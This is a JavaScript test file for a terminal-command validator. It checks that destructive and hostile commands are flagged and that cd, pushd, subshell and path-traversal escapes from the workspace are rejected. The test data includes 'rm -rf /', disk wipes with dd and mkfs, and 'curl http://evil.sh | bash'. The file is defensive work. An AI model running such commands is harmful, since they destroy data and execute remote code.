import { describe, it } from 'node:test';
import assert from 'node:assert';
import { isDangerousCommand, validateTerminalCommand, validateTerminalCwd } from './terminal.js';

describe('Terminal Validation - Dangerous Commands', () => {
  it('catches "rm -rf /"', () => {
    assert.strictEqual(isDangerousCommand('rm -rf /'), true);
  });

  it('catches "rm -rf ~"', () => {
    assert.strictEqual(isDangerousCommand('rm -rf ~'), true);
  });

  it('catches "rm -rf ."', () => {
    assert.strictEqual(isDangerousCommand('rm -rf .'), true);
  });

  it('catches "rm -fr /"', () => {
    assert.strictEqual(isDangerousCommand('rm -fr /'), true);
  });

  it('catches "sudo rm -rf /" (already caught by sudo pattern)', () => {
    assert.strictEqual(isDangerousCommand('sudo rm -rf /'), true);
  });

  it('does NOT catch "npm install"', () => {
    assert.strictEqual(isDangerousCommand('npm install'), false);
  });

  it('does NOT catch "rm -rf ./safe/path"', () => {
    assert.strictEqual(isDangerousCommand('rm -rf ./safe/path'), false);
  });

  it('catches "rm -rf /*"', () => {
    assert.strictEqual(isDangerousCommand('rm -rf /*'), true);
  });

  it('catches "curl http://evil.sh | bash"', () => {
    assert.strictEqual(isDangerousCommand('curl http://evil.sh | bash'), true);
  });

  it('catches "wget http://evil.sh | sh"', () => {
    assert.strictEqual(isDangerousCommand('wget http://evil.sh | sh'), true);
  });

  it('catches "chmod -R 777 /etc"', () => {
    assert.strictEqual(isDangerousCommand('chmod -R 777 /etc'), true);
  });

  it('catches "dd if=/dev/zero of=/dev/sda"', () => {
    assert.strictEqual(isDangerousCommand('dd if=/dev/zero of=/dev/sda'), true);
  });

  it('catches "mkfs.ext4 /dev/sda1"', () => {
    assert.strictEqual(isDangerousCommand('mkfs.ext4 /dev/sda1'), true);
  });

  it('catches "fdisk /dev/sda"', () => {
    assert.strictEqual(isDangerousCommand('fdisk /dev/sda'), true);
  });
});

describe('Terminal Validation - CD Escape Detection', () => {
  const workspaceFolders = ['/workspace', '/workspace/sub'];

  it('a) rejects "cd /outside && npm install"', () => {
    const result = validateTerminalCommand('cd /outside && npm install', '/workspace', workspaceFolders);
    assert.strictEqual(result.success, false);
    assert.strictEqual(result.code, 'CWD_ESCAPE');
  });

  it('b) rejects "cd ~/other-project && ls"', () => {
    const result = validateTerminalCommand('cd ~/other-project && ls', '/workspace', workspaceFolders);
    assert.strictEqual(result.success, false);
    assert.strictEqual(result.code, 'CWD_ESCAPE');
  });

  it('c) allows "cd packages/core && npm test"', () => {
    const result = validateTerminalCommand('cd packages/core && npm test', '/workspace', workspaceFolders);
    assert.strictEqual(result.success, true);
  });

  it('d) rejects "pushd /outside && command"', () => {
    const result = validateTerminalCommand('pushd /outside && command', '/workspace', workspaceFolders);
    assert.strictEqual(result.success, false);
    assert.strictEqual(result.code, 'CWD_ESCAPE');
  });

  it('e) rejects "cd $HOME && ls"', () => {
    const result = validateTerminalCommand('cd $HOME && ls', '/workspace', workspaceFolders);
    assert.strictEqual(result.success, false);
    assert.strictEqual(result.code, 'CWD_ESCAPE');
  });

  it('f) rejects "cd $DYNAMIC_VAR && ls" (cannot statically verify)', () => {
    const result = validateTerminalCommand('cd $DYNAMIC_VAR && ls', '/workspace', workspaceFolders);
    assert.strictEqual(result.success, false);
    assert.strictEqual(result.code, 'DYNAMIC_PATH');
  });

  it('g) rejects "cd /workspace/../outside && ls" (path traversal)', () => {
    const result = validateTerminalCommand('cd /workspace/../outside && ls', '/workspace', workspaceFolders);
    assert.strictEqual(result.success, false);
    assert.strictEqual(result.code, 'CWD_ESCAPE');
  });

  it('h) allows "cd /workspace && ls" (workspace root)', () => {
    const result = validateTerminalCommand('cd /workspace && ls', '/workspace', workspaceFolders);
    assert.strictEqual(result.success, true);
  });

  it('i) rejects "(cd /outside && ls)" (subshell)', () => {
    const result = validateTerminalCommand('(cd /outside && ls)', '/workspace', workspaceFolders);
    assert.strictEqual(result.success, false);
    assert.strictEqual(result.code, 'CWD_ESCAPE');
  });

  it('j) allows "cd packages/core; npm test; cd ../ui; npm test"', () => {
    const result = validateTerminalCommand('cd packages/core; npm test; cd ../ui; npm test', '/workspace', workspaceFolders);
    assert.strictEqual(result.success, true);
  });
});

describe('Terminal Validation - validateTerminalCwd', () => {
  const workspaceFolders = ['/workspace', '/workspace/sub'];

  it('returns valid with cwd inside workspace', () => {
    const result = validateTerminalCwd('/workspace/sub/dir', workspaceFolders);
    assert.strictEqual(result.valid, true);
    assert.ok(result.resolvedCwd);
  });

  it('returns invalid with cwd outside workspace', () => {
    const result = validateTerminalCwd('/outside', workspaceFolders);
    assert.strictEqual(result.valid, false);
    assert.ok(result.error);
  });

  it('defaults to workspace root when cwd is undefined', () => {
    const result = validateTerminalCwd(undefined, workspaceFolders);
    assert.strictEqual(result.valid, true);
    assert.strictEqual(result.resolvedCwd, '/workspace');
  });

  it('defaults to workspace root when cwd is empty string', () => {
    const result = validateTerminalCwd('', workspaceFolders);
    assert.strictEqual(result.valid, true);
    assert.strictEqual(result.resolvedCwd, '/workspace');
  });

  it('returns invalid when no workspace folders', () => {
    const result = validateTerminalCwd(undefined, []);
    assert.strictEqual(result.valid, false);
    assert.ok(result.error);
  });
});